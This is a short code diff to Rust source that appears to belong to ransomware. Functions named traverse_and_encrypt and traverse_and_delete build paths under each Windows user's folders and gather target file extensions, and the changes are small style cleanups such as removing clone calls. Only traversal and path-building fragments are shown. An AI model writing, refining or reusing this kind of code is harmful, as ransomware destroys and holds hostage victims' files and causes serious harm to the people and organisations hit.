@@ -31,7 +31,7 @@ pub fn traverse_and_encrypt() {
 
         // push all valid extension into VALID_EXTENSION_VEC
         for each in ext.iter() {
-            VALID_EXTENSION_VEC.push(each.clone());
+            VALID_EXTENSION_VEC.push(*each);
         }
     }
 
@@ -68,8 +68,8 @@ pub fn traverse_and_encrypt() {
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
             full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
-            full_path.push_str("\\");
-            full_path.push_str(dir.clone());
+            full_path.push('\\');
+            full_path.push_str(dir);
             full_path.push_str("\\*");
             // extract path and call traverse
             let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
@@ -248,7 +248,7 @@ pub fn traverse_and_delete() {
             let mut full_path = String::from("C:\\Users\\");
             full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
             full_path.push_str("\\");
-            full_path.push_str(dir.clone());
+            full_path.push_str(dir);
             full_path.push_str("\\*");
             // extract path and call traverse
             let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
